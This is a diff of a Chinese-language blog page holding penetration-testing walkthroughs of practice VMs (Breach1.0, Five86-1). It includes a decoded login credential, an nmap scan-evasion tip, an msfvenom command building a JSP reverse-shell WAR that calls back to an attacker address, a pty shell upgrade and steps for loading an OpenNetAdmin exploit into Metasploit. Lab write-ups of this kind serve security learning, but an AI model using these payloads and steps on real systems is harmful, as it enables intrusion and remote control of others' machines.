@@ -39,8 +39,14 @@
 <meta property="og:image" content="https://i.loli.net/2021/05/13/4Bw1tUfXdkmvNQ6.png">
 <meta property="og:image" content="https://i.loli.net/2021/05/13/7PcaTGvr3MXZBwm.png">
 <meta property="og:image" content="https://i.loli.net/2021/05/13/FvfjmRVUbPzk5WX.png">
+<meta property="og:image" content="https://i.loli.net/2021/05/13/WTVzvbgFcrksuU2.png">
+<meta property="og:image" content="https://i.loli.net/2021/05/14/x4BjoNLF6eKCp1v.png">
+<meta property="og:image" content="https://i.loli.net/2021/05/14/XfprCJUjvYn7TIK.png">
+<meta property="og:image" content="https://i.loli.net/2021/05/14/HuPBYdxZX9LylKs.png">
+<meta property="og:image" content="https://i.loli.net/2021/05/14/IFRLAYWqaoGtS8v.png">
+<meta property="og:image" content="https://i.loli.net/2021/05/14/vHzlJdCqMFou97O.jpg">
 <meta property="article:published_time" content="2021-05-10T14:20:36.000Z">
-<meta property="article:modified_time" content="2021-05-13T14:37:38.929Z">
+<meta property="article:modified_time" content="2021-05-13T17:19:08.711Z">
 <meta property="article:author" content="Du1">
 <meta property="article:tag" content="渗透">
 <meta name="twitter:card" content="summary">
@@ -142,7 +148,7 @@
 
     </div>
     <div id="toc">
-      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Me-and-My-Girlfriend-1"><span class="toc-number">1.</span> <span class="toc-text">Me and My Girlfriend: 1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Billu-b0x"><span class="toc-number">2.</span> <span class="toc-text">Billu_b0x</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Breach1-0"><span class="toc-number">3.</span> <span class="toc-text">Breach1.0</span></a></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Me-and-My-Girlfriend-1"><span class="toc-number">1.</span> <span class="toc-text">Me and My Girlfriend: 1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Billu-b0x"><span class="toc-number">2.</span> <span class="toc-text">Billu_b0x</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Breach1-0"><span class="toc-number">3.</span> <span class="toc-text">Breach1.0</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Five86-1"><span class="toc-number">4.</span> <span class="toc-text">Five86-1</span></a></li></ol>
     </div>
   </span>
 </div>
@@ -307,7 +313,7 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">192.168.110.1</span><br><span class="line">255.255.255.0</span><br><span class="line">192.168.110.254</span><br></pre></td></tr></table></figure>
 
 <hr>
-<p>Nmap 扫一下发现它把所有端口都开放了……我们直接访问 http。在 <a target="_blank" rel="noopener" href="http://192.168.110.140/impresscms/user.php">http://192.168.110.140/impresscms/user.php</a> 可以登录 cms。</p>
+<p>Nmap 扫一下发现它把所有端口都开放了（可以用 -sF 绕过防探测策略）……我们直接访问 http。在 <a target="_blank" rel="noopener" href="http://192.168.110.140/impresscms/user.php">http://192.168.110.140/impresscms/user.php</a> 可以登录 cms。</p>
 <p><img src="https://i.loli.net/2021/05/11/mdCOWsfSDtXPM7F.png"></p>
 <p>在 index 注释中找到一段 Base64：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Y0dkcFltSnZibk02WkdGdGJtbDBabVZsYkNSbmIyOWtkRzlpWldGbllXNW5KSFJo</span><br><span class="line">cGdpYmJvbnM6ZGFtbml0ZmVlbCRnb29kdG9iZWFnYW5nJHRh</span><br><span class="line">pgibbons:damnitfeel$goodtobeagang$ta</span><br></pre></td></tr></table></figure>
@@ -329,7 +335,7 @@
 
 <p>访问 <a target="_blank" rel="noopener" href="https://192.168.110.140:8443/_M@nag3Me/html%EF%BC%8C%E5%A6%82%E6%9E%9C%E7%99%BB%E5%BD%95%E4%B8%8D%E6%88%90%E5%8A%9F%E5%8F%AF%E4%BB%A5%E5%B0%9D%E8%AF%95">https://192.168.110.140:8443/_M@nag3Me/html，如果登录不成功可以尝试</a> BP 发包（因为最新版浏览器如果没有相应证书会有限制，但是 BP 中有各种证书，挂个 BP 代理就上了）</p>
 <p><img src="https://i.loli.net/2021/05/11/CszhpEtxGVRDdNH.png"></p>
-<p>可以上传包含 jsp 马的 war 包，利用 msf 直接生成：<code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.110.100 LPORT=2333 -f war &gt; shell.war</code>，在 msf 上设置一个监听，然后直接传马访问：</p>
+<p>可以上传包含 jsp 马的 war 包，利用 msf 直接生成：<code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.110.100 LPORT=2333 -f war &gt; shell.war</code>，在 msf 上设置一个监听，然后直接传马访问：（弹回来的 shell 要等巨 JB 久，👴是要放弃的时候突然发现，欸，怎么 connect 了）</p>
 <p><img src="https://i.loli.net/2021/05/13/rltALPbhEco47BK.png"></p>
 <p><img src="https://i.loli.net/2021/05/13/dZcur9L3xApOGPj.jpg" alt="~_G_QMR9_8RRP1MXL_V@N_3.jpg"></p>
 <p>此时拿到了 shell 了，可以用 python 来获取交互式 shell：<code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39; </code></p>
@@ -387,6 +393,16 @@
 <p><img src="https://i.loli.net/2021/05/13/7PcaTGvr3MXZBwm.png"></p>
 <p><img src="https://i.loli.net/2021/05/13/FvfjmRVUbPzk5WX.png"></p>
 <p>可以发现我们已经提权至了 root，后面 flag 什么的便不重要了。</p>
+<h2 id="Five86-1"><a href="#Five86-1" class="headerlink" title="Five86-1"></a>Five86-1</h2><p>Nmap 扫一下。</p>
+<p><img src="https://i.loli.net/2021/05/13/WTVzvbgFcrksuU2.png" alt="U_MH_Q9JAM05PC__GW77DJ5.png"></p>
+<p>10000 端口开了个 <code>Webmin httpd 1.920</code>，可以搜一下有无 exp。（Webmin 是一个很好的 UNIX web 管理）</p>
+<p><img src="https://i.loli.net/2021/05/14/x4BjoNLF6eKCp1v.png"></p>
+<p>robots.txt 里发现 /ona 路由，访问一下，发现是 OpenNetAdmin，搜一下有无 exp：</p>
+<p><img src="https://i.loli.net/2021/05/14/XfprCJUjvYn7TIK.png"></p>
+<p><img src="https://i.loli.net/2021/05/14/HuPBYdxZX9LylKs.png"></p>
+<p><code>cp /usr/share/exploitdb/exploits/php/webapps/47772.rb /usr/share/metasploit-framework/modules/exploits</code></p>
+<p><img src="https://i.loli.net/2021/05/14/IFRLAYWqaoGtS8v.png" alt="2VVE3EMW08WLWS__PGPW_Z9.png"></p>
+<p><img src="https://i.loli.net/2021/05/14/vHzlJdCqMFou97O.jpg"></p>
 
   </div>
 </article>
@@ -416,7 +432,7 @@
     </div>
 
     <div id="toc-footer" style="display: none">
-      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Me-and-My-Girlfriend-1"><span class="toc-number">1.</span> <span class="toc-text">Me and My Girlfriend: 1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Billu-b0x"><span class="toc-number">2.</span> <span class="toc-text">Billu_b0x</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Breach1-0"><span class="toc-number">3.</span> <span class="toc-text">Breach1.0</span></a></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Me-and-My-Girlfriend-1"><span class="toc-number">1.</span> <span class="toc-text">Me and My Girlfriend: 1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Billu-b0x"><span class="toc-number">2.</span> <span class="toc-text">Billu_b0x</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Breach1-0"><span class="toc-number">3.</span> <span class="toc-text">Breach1.0</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Five86-1"><span class="toc-number">4.</span> <span class="toc-text">Five86-1</span></a></li></ol>
     </div>
 
     <div id="share-footer" style="display: none">
